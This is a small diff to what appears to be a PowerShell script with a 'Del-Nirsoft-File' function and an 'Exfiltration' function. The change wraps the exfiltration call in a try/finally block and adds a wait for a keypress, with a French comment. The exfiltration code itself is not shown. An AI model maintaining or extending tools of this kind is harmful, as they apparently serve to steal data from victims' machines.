@@ -115,5 +115,12 @@ function Del-Nirsoft-File {
   exit
 }
 
-# Call Exfiltration function
+try {
+    # Call Exfiltration function
     Exfiltration
+}
+finally {
+    # Cela sera exécuté même en cas d'erreur
+    # Attendre que la fenêtre soit fermée avant de quitter
+    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
+}
